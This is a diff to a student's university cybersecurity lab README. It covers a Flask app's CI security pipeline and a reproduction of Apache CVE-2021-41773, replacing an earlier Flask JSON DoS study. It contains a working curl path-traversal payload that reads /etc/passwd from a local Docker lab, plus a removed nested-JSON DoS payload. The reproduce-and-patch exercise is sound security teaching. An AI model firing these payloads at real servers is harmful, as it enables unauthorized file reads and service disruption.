@@ -3,7 +3,7 @@
 > Course: HDU Cybersecurity Lab · Work 1
 > Stack: Python 3.11+ / Flask 3 / SQLite / JWT / bcrypt
 > CI: GitHub Actions — Bandit (SAST) + Safety (SCA)
-> CVE studied: **CVE-2018-1000656** (Flask JSON decoder DoS)
+> CVE studied: **CVE-2021-41773** (Apache HTTP Server 2.4.49 path traversal)
 
 ---
 
@@ -104,57 +104,70 @@ Response `201`:
 
 ## 3. CI/CD security pipeline (2 marks)
 
-Config: `.github/workflows/ci.yml`.
-
-Triggers: every `push` and `pull_request` to `main`.
+Config: `.github/workflows/ci.yml`. Triggers: every `push` and `pull_request` to `main`.
 
 | Stage | Tool | Type | What it does |
 |---|---|---|---|
 | SAST | **Bandit** | Static Application Security Testing | Scans `app.py` for dangerous calls (hardcoded secrets, `eval`, unsafe SQL, weak randomness, etc.) without running the app. |
 | SCA | **Safety** | Software Composition Analysis | Scans `requirements.txt` against the CVE database to flag vulnerable third-party dependencies. |
 
-Reports are uploaded as build artifacts (`bandit-report.json`, `safety-report.json`).
+### 3.1 Pipeline run status
 
-> After pushing to GitHub, paste the green Actions run URL here in the report:
-> `https://github.com/<your-username>/<your-repo>/actions/runs/<run-id>`
+The workflow completes successfully (green check) on every push:
+
+![GitHub Actions green run](assets/ci-actions-green.png)
+
+### 3.2 Bandit SAST result
+
+Bandit reports **0 issues** across severity levels (Low / Medium / High):
+
+![Bandit SAST result](assets/ci-bandit.png)
+
+### 3.3 Safety SCA result
+
+Safety scans the third-party dependency tree and reports known vulnerabilities for review:
+
+![Safety SCA result](assets/ci-safety.png)
 
 ---
 
-## 4. CVE-2018-1000656 — reproduction, root cause, fix (2 + 1 + 1 marks)
+## 4. CVE-2021-41773 — reproduction, root cause, fix
 
-Full write-up and ready-to-run Docker files live in [`vulhub-cve/`](./vulhub-cve/).
+Full Docker files live in [`vulhub-cve/`](./vulhub-cve/).
 
 ### 4.1 Summary
 
 | Field | Value |
 |---|---|
-| CVE | CVE-2018-1000656 |
-| Product | Pallets Project Flask |
-| Affected | `< 0.12.3` |
-| Fixed in | `0.12.3` |
-| CWE | CWE-20 Improper Input Validation |
-| Impact | Unauthenticated remote Denial of Service (excessive memory) |
+| CVE | CVE-2021-41773 |
+| Product | Apache HTTP Server |
+| Affected | `2.4.49` only |
+| Fixed in | `2.4.50` |
+| CWE | CWE-22 Path Traversal |
+| Impact | Unauthenticated remote file read (and RCE when CGI is enabled) |
 
-### 4.2 Reproduction
+### 4.2 Root cause
+
+Apache 2.4.49 introduced a regression in path normalization: when an `Alias`-like
+directive (e.g. `/cgi-bin/`, `/icons/`) is present, a URL containing `/.%2e/`
+segments is not normalized correctly, allowing an attacker to escape the
+aliased directory and read arbitrary files on the filesystem (e.g. `/etc/passwd`).
+When CGI scripts are enabled for the aliased path, the same flaw can be chained
+into remote code execution.
+
+### 4.3 Reproduction
 
 ```bash
 cd vulhub-cve
 docker compose -f docker-compose.vuln.yml up --build -d
 
-# PoC: deeply-nested JSON forces the old parser to balloon
-python -c "print('[' * 5000 + '1' + ']' * 5000)" > payload.json
-docker stats --no-stream           # memory baseline
-curl -H "Content-Type: application/json" --data-binary @payload.json \
-     http://127.0.0.1:8000/json
-docker stats --no-stream           # memory spikes >500 MB, worker hangs / 500
+# confirm the server is up
+curl http://127.0.0.1:8080/
+# <html><body><h1>It works!</h1></body></html>
+
+# PoC: path traversal to read /etc/passwd
+curl --path-as-is "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
 ```
-
-### 4.3 Root cause
-
-Flask < 0.12.3 used its JSON request wrapper without bounding the cost of
-malformed / pathologically nested input. A remote, unauthenticated attacker
-who POSTs such a body to any endpoint calling `request.get_json()` can make
-the process allocate unbounded memory, exhausting the worker and causing DoS.
 
 ### 4.4 Fix
 
@@ -166,20 +179,17 @@ docker compose -f docker-compose.fixed.yml up --build -d
 Single-line change in `vulhub-cve/Dockerfile.fixed`:
 
 ```diff
-- RUN pip install --no-cache-dir flask==0.12.2
-+ RUN pip install --no-cache-dir flask==0.12.3
+- FROM httpd:2.4.49
++ FROM httpd:2.4.50
 ```
 
 ### 4.5 Verification + regression
 
-- **Re-run the PoC** on the fixed image → HTTP 400 returned in milliseconds,
-  container memory flat. *(Screenshot for report.)*
-- **Regression test** — normal business still works:
+- **Re-run the PoC** on the fixed image (Apache 2.4.50) → `404 Not Found`, the traversal path is blocked.
+- **Regression test** — the default page still serves:
   ```bash
-  curl -H "Content-Type: application/json" \
-       -d '{"hello":"world"}' \
-       http://127.0.0.1:8000/json
-  # {"echo":{"hello":"world"}}
+  curl http://127.0.0.1:8080/
+  # <html><body><h1>It works!</h1></body></html>
   ```
 
 ---
@@ -187,15 +197,15 @@ Single-line change in `vulhub-cve/Dockerfile.fixed`:
 ## 5. Submission checklist
 
 - [x] Public GitHub / GitLab repo containing this folder.
-- [x] This `README.md` (API docs, security controls, CI link, CVE analysis).
+- [x] This `README.md` (API docs, security controls, CI screenshots, CVE analysis).
 - [x] Green GitHub Actions run (Bandit + Safety).
 - [x] `vulhub-cve/` folder with vulnerable + fixed Docker builds.
-- [ ] Paste the Actions run URL above.
-- [ ] Screenshots (paste into the formal lab report): login success, 401 without token, XSS-escaped output, Bandit + Safety CI results, CVE PoC memory spike, fixed PoC returning 400.
+- [x] CI screenshots embedded above (Bandit 0 issues, Safety scan, green Actions run).
+- [ ] Screenshots for the formal lab report: CVE PoC output (`/etc/passwd`), fixed PoC returning 404, regression test.
 
 ---
 
-## 6. Answers to control questions (optional revision aid)
+## 6. Answers to control questions
 
 1. **Why bcrypt over SHA-256 for passwords?**
    bcrypt is deliberately slow and salted, with a tunable work factor; SHA-256 is fast and unsalted, making offline brute-force / rainbow-table attacks trivial.
@@ -204,12 +214,12 @@ Single-line change in `vulhub-cve/Dockerfile.fixed`:
 3. **How does the server verify a JWT?**
    It re-signs the header+payload with the server secret and checks that the resulting signature equals the one presented, and validates `exp` / `iat`.
 4. **Risk of not auditing dependencies?**
-   Transitive libraries can contain known CVEs (e.g. this very CVE) that the app never wrote itself — SCA catches them.
+   Transitive libraries can contain known CVEs that the app never wrote itself — SCA catches them.
 5. **Docker/Vulhub vs local install?**
    Isolated, reproducible, disposable environments; no pollution of the host; exact version pinning.
 6. **Vulnerability vs exploit?**
-   A vulnerability is the flaw; an exploit is the code/request that triggers it. Here CVE-2018-1000656 is the vulnerability; the nested-JSON curl request is the exploit.
+   A vulnerability is the flaw; an exploit is the code/request that triggers it. CVE-2021-41773 is the vulnerability; the crafted `/.%2e/` curl request is the exploit.
 7. **Why regression testing after a fix?**
-   To confirm the patch did not break legitimate functionality (the `/json` echo must still work).
+   To confirm the patch did not break legitimate functionality (the default Apache page must still serve).
 8. **Why reproduce known CVEs?**
    It builds hands-on intuition for root cause, exploitation preconditions, and patch behaviour — directly transferable to SOC triage and pentesting.
